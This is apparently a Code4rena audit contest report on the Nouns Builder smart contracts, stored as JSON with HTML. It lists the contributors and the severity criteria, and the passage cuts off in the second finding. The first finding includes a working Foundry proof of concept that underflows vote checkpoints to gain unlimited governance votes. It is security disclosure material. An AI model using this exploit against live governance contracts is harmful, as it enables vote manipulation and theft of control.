{
  "circa": {
    "title": "Nouns Builder contest",
    "sponsor": "Nouns Builder",
    "slug": "2022-09-nouns-builder",
    "date": "2022-11-03",
    "findings": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues",
    "contest": 157
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit contest outlined in this document, C4 conducted an analysis of the Nouns Builder smart contract system written in Solidity. The audit contest took place between September 6—September 15 2022.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>176 Wardens contributed reports to the Nouns Builder contest:</p>\n<ol>\n<li><a href=\"https://twitter.com/0xhyh\">hyh</a></li>\n<li>rvierdiiev</li>\n<li><a href=\"https://chom.dev\">Chom</a></li>\n<li>scaraven</li>\n<li><a href=\"https://jeiwan.net\">Jeiwan</a></li>\n<li>PwnPatrol (<a href=\"https://twitter.com/zachobront\">obront</a> and <a href=\"https://twitter.com/Throt7le\">throttle</a>)</li>\n<li>davidbrai</li>\n<li>0xA5DF</li>\n<li><a href=\"https://tom-sol.notion.site/Who-am-I-3b4dc28e77b647eb90794735a94dd38e\">Tomo</a></li>\n<li><a href=\"https://twitter.com/angel_tripi\">Migue</a></li>\n<li>V_B (Barichek and vlad_bochok)</li>\n<li><a href=\"https://twitter.com/0xch301\">Ch_301</a></li>\n<li>rbserver</li>\n<li>Lambda</li>\n<li>Soosh</li>\n<li>CertoraInc (egjlmn1, <a href=\"https://twitter.com/ori_dabush\">OriDabush</a>, ItayG, shakedwinder, and RoiEvenHaim)</li>\n<li><a href=\"https://twitter.com/thePicodes\">Picodes</a></li>\n<li>arcoun</li>\n<li>Solimander</li>\n<li><a href=\"https://twitter.com/SolidityDev\">pauliax</a></li>\n<li><a href=\"https://twitter.com/berndartmueller\">berndartmueller</a></li>\n<li>ayeslick</li>\n<li>R2</li>\n<li><a href=\"https://twitter.com/bin2chen\">bin2chen</a></li>\n<li><a href=\"https://t.me/pfahard\">pfapostol</a></li>\n<li>cccz</li>\n<li><a href=\"https://twitter.com/csanuragjain\">csanuragjain</a></li>\n<li>m9800</li>\n<li>__141345__</li>\n<li><a href=\"https://milotruck.github.io/\">MiloTruck</a></li>\n<li><a href=\"https://twitter.com/meppent\">MEP</a></li>\n<li><a href=\"https://www.cs.purdue.edu/homes/zhan3299/index.html\">izhuer</a></li>\n<li>ladboy233</li>\n<li>imare</li>\n<li>zkhorse (<a href=\"twitter.com/0xkarmacoma\">karmacoma</a> and horsefacts)</li>\n<li>pashov</li>\n<li><a href=\"https://twitter.com/0xSmartContract\">0xSmartContract</a></li>\n<li>0xSky</li>\n<li><a href=\"https://twitter.com/pcarranzav\">pcarranzav</a></li>\n<li>sorrynotsorry</li>\n<li>0x52</li>\n<li>0x4non</li>\n<li><a href=\"https://twitter.com/Deivitto\">Deivitto</a></li>\n<li>dipp</li>\n<li>azephiar</li>\n<li>hxzy</li>\n<li><a href=\"https://github.com/Aymen1001\">Aymen0909</a></li>\n<li>volky</li>\n<li>Tointer</li>\n<li>cryptphi</li>\n<li><a href=\"https://twitter.com/JoeStakey\">joestakey</a></li>\n<li>simon135</li>\n<li>rotcivegaf</li>\n<li>saian</li>\n<li><a href=\"https://twitter.com/kamensec\">elprofesor</a></li>\n<li>zzzitron</li>\n<li><a href=\"https://twitter.com/krenkmet\">indijanc</a></li>\n<li>pedr02b2</li>\n<li>yixxas</li>\n<li><a href=\"https://mobile.twitter.com/tomj_bb\">TomJ</a></li>\n<li>datapunk</li>\n<li>elad</li>\n<li><a href=\"https://twitter.com/father0fBl0cks\">fatherOfBlocks</a></li>\n<li>GimelSec (<a href=\"https://twitter.com/rayn731\">rayn</a> and sces60107)</li>\n<li><a href=\"https://twitter.com/hansfriese\">hansfriese</a></li>\n<li>_Adam</li>\n<li>0x1f8b</li>\n<li>0xc0ffEE</li>\n<li>CodingNameKiki</li>\n<li><a href=\"https://twitter.com/c3ph_\">c3phas</a></li>\n<li>ak1</li>\n<li>ChristianKuri</li>\n<li>brgltd</li>\n<li><a href=\"https://www.linkedin.com/in/georgi-nikolaev-georgiev-978253219\">gogo</a></li>\n<li>tonisives</li>\n<li>peritoflores</li>\n<li>ReyAdmirado</li>\n<li><a href=\"https://twitter.com/ElKu_crypto\">ElKu</a></li>\n<li>Rolezn</li>\n<li>leosathya</li>\n<li><a href=\"https://twitter.com/andyfeili\">oyc_109</a></li>\n<li>RaymondFam</li>\n<li>djxploit</li>\n<li>Waze</li>\n<li><a href=\"https://github.com/martin-petrov03\">martin</a></li>\n<li>robee</li>\n<li><a href=\"https://twitter.com/RespxR\">Respx</a></li>\n<li>asutorufos</li>\n<li>Bnke0x0</li>\n<li>ch0bu</li>\n<li>PPrieditis</li>\n<li>bulej93</li>\n<li><a href=\"https://twitter.com/ret2basic\">ret2basic</a></li>\n<li>ballx</li>\n<li>lucacez</li>\n<li>sikorico</li>\n<li>Samatak</li>\n<li><a href=\"https://franfran.dev/\">Franfran</a></li>\n<li>PaludoX0</li>\n<li><a href=\"https://twitter.com/im_Dharma09\">dharma09</a></li>\n<li>wagmi</li>\n<li>eierina</li>\n<li><a href=\"https://twitter.com/0xNazgul\">0xNazgul</a></li>\n<li>LeoS</li>\n<li>chatch</li>\n<li>d3e4</li>\n<li>neumo</li>\n<li>minhtrng</li>\n<li>0x1337</li>\n<li>B2</li>\n<li>erictee</li>\n<li>ne0n</li>\n<li><a href=\"https://twitter.com/8olidity\">8olidity</a></li>\n<li><a href=\"https://twitter.com/jonataspvt\">jonatascm</a></li>\n<li>0x85102</li>\n<li>sahar</li>\n<li>EthLedger</li>\n<li>lukris02</li>\n<li>cryptostellar5</li>\n<li>Jujic</li>\n<li>sach1r0</li>\n<li><a href=\"https://twitter.com/Bharg4v\">bharg4v</a></li>\n<li>Captainkay</li>\n<li>cryptonue</li>\n<li><a href=\"https://www.linkedin.com/in/jansen-moreira/?locale=en_US\">JansenC</a></li>\n<li>slowmoses</li>\n<li>tnevler</li>\n<li>bobirichman</li>\n<li>cloudjunky</li>\n<li>Diana</li>\n<li><a href=\"https://instagram.com/vanensurya\">Funen</a></li>\n<li>0xbepresent</li>\n<li><a href=\"https://twitter.com/a12jmx\">a12jmx</a></li>\n<li>delfin454000</li>\n<li>DimitarDimitrov</li>\n<li>MasterCookie</li>\n<li>Noah3o6</li>\n<li>p_crypt0</li>\n<li>CRYP70</li>\n<li>dic0de</li>\n<li>Lead_Belly</li>\n<li><a href=\"https://twitter.com/randyyramadhan\">Randyyy</a></li>\n<li>SnowMan</li>\n<li><a href=\"https://github.com/antoncoding\">antonttc</a></li>\n<li>easy_peasy</li>\n<li>Saintcode_</li>\n<li>JAGADESH</li>\n<li>immeas</li>\n<li>DimSon</li>\n<li>WatchDogs</li>\n<li><a href=\"https://www.instagram.com/riyan_rfa/\">rfa</a></li>\n<li><a href=\"https://twitter.com/sm4rtcontr4ct\">JC</a></li>\n<li>Matin</li>\n<li><a href=\"https://twitter.com/dediranTofunmi\">tofunmi</a></li>\n<li>gianganhnguyen</li>\n<li><a href=\"https://twitter.com/prasantgupta52\">prasantgupta52</a></li>\n<li>StevenL</li>\n<li><a href=\"https://github.com/lyciumlee\">durianSausage</a></li>\n<li>Cr4ckM3</li>\n<li>Metatron</li>\n<li>0xkatana</li>\n<li><a href=\"https://www.linkedin.com/in/evgeniy-shaldin-21898712a/\">Chandr</a></li>\n<li><a href=\"https://zishansami102.github.io/\">zishansami</a></li>\n<li>0x5rings</li>\n<li>peiw</li>\n<li>ajtra</li>\n<li><a href=\"https://twitter.com/teawaterwire\">teawaterwire</a></li>\n<li>unforgiven</li>\n</ol>\n<p>This contest was judged by <a href=\"https://twitter.com/GalloDaSballo\">Alex the Entreprenerd</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/liveactionllama\">liveactionllama</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 33 unique vulnerabilities. Of these vulnerabilities, 5 received a risk rating in the category of HIGH severity and 28 received a risk rating in the category of MEDIUM severity. Per Nouns Builder, all of these HIGH and MEDIUM severity findings have been addressed as of <a href=\"https://github.com/ourzora/nouns-protocol/commit/dcfd8bcd1b33c05601c9e9244fc479130ba0d378\">this commit</a>.</p>\n<p>Additionally, C4 analysis included 124 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 75 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2022-09-nouns-builder\">C4 Nouns Builder contest repository</a>, and is composed of 46 smart contracts written in the Solidity programming language and includes 4,046 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities according to a methodology based on <a href=\"https://owasp.org/www-community/OWASP_Risk_Rating_Methodology\">OWASP standards</a>.</p>\n<p>Vulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>Further information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>.</p>\n<h1 id=\"high-risk-findings-5\" style=\"position:relative;\"><a href=\"#high-risk-findings-5\" aria-label=\"high risk findings 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (5)</h1>\n<h2 id=\"h-01-user-can-get-unlimited-votes\" style=\"position:relative;\"><a href=\"#h-01-user-can-get-unlimited-votes\" aria-label=\"h 01 user can get unlimited votes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/469\">[H-01] User can get unlimited votes</a></h2>\n<p><em>Submitted by saian, also found by 0x4non, Ch_301, davidbrai, izhuer, MEP, Picodes, PwnPatrol, R2, rotcivegaf, scaraven, and Soosh</em></p>\n<p><code>aftertokenTransfer</code> in ERC721Votes transfers votes between user addresses instead of the delegated addresses, so a user can cause overflow in <code>_moveDelegates</code> and get unlimited votes.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268\">https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _afterTokenTransfer(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address _from,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address _to,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 _tokenId</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) internal override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Transfer 1 vote from the sender to the recipient</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _moveDelegateVotes(_from, _to, 1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        super._afterTokenTransfer(_from, _to, _tokenId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L216\">https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L216</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    unchecked {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                ...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                // Update their voting weight</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span></code></pre>\n<p>During delegation <code>balanceOf(from)</code> amount of votes transferred are to the <code>_to</code> address</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function test_UserCanGetUnlimitedVotes() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(founder);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        auction.unpause();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(bidder1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        auction.createBid{ value: 1 ether }(2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.warp(10 minutes + 1 seconds);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        auction.settleCurrentAndCreateNewAuction();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(token.ownerOf(2), bidder1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(token.getVotes(bidder1)); // 1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(token.delegates(bidder1)); // 0 bidder1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(bidder1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        token.delegate(bidder2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(token.getVotes(bidder1)); // 1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(token.getVotes(bidder2)); // 1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(bidder1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        auction.createBid{value: 1 ether}(3);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.warp(22 minutes);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        auction.settleCurrentAndCreateNewAuction();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(token.ownerOf(3), bidder1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(token.balanceOf(bidder1)); // 2</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(token.getVotes(bidder1)); // 2</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(token.getVotes(bidder2)); // 1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(bidder1);        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        token.delegate(bidder1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(token.getVotes(bidder1)); // 4</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(token.getVotes(bidder2)); // 6277101735386680763835789423207666416102355444464034512895     </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p>When user1 delegates to another address <code>balanceOf(user1)</code> amount of tokens are subtraced from user2’s votes, this will cause underflow and not revert since the statements are unchecked</p>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry</p>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Change delegate transfer in <code>afterTokenTransfer</code> to</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">        _moveDelegateVotes(delegates(_from), delegates(_to), 1);</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/469#issuecomment-1257276491\">Alex the Entreprenerd (judge) increased severity to High and commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown how to exploit:</p>\n<ul>\n<li>An unchecked section of the code</li>\n<li>An incorrect logic in moving tokenDelegation</li>\n</ul>\n<p>To trigger an underflow that gives each user the maximum voting power.</p>\n<p>While some setup is necessary (having 1 token), I think the exploit is impactful enough to warrant High Severity, as any attacker will be able to obtain infinite voting power on multiple accounts.</p>\n<p>In contrast to other reports, this finding (as well as it’s duplicates) are using an unchecked operation to negatively overflow the amount of votes to gain the maximum value.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/469\">tbtstl (Nouns Builder) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-02-erc721votess-delegation-disables-nft-transfers-and-burning\" style=\"position:relative;\"><a href=\"#h-02-erc721votess-delegation-disables-nft-transfers-and-burning\" aria-label=\"h 02 erc721votess delegation disables nft transfers and burning permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/373\">[H-02] ERC721Votes’s delegation disables NFT transfers and burning</a></h2>\n<p><em>Submitted by hyh</em></p>\n<p>If Alice the NFT owner first delegates her votes to herself, second delegates to anyone else with delegate() or delegateBySig() then all her NFT ids will become stuck: their transfers and burning will be disabled.</p>\n<p>The issue is _afterTokenTransfer() callback running the _moveDelegateVotes() with an owner instead of her delegate. As Alice’s votes in the checkpoint is zero after she delegated them, the subtraction _moveDelegateVotes() tries to perform during the move of the votes will be reverted.</p>\n<p>As ERC721Votes is parent to Token and delegate is a kind of common and frequent operation, the impact is governance token moves being frozen in a variety of use cases, which interferes with governance voting process and can be critical for the project.</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" 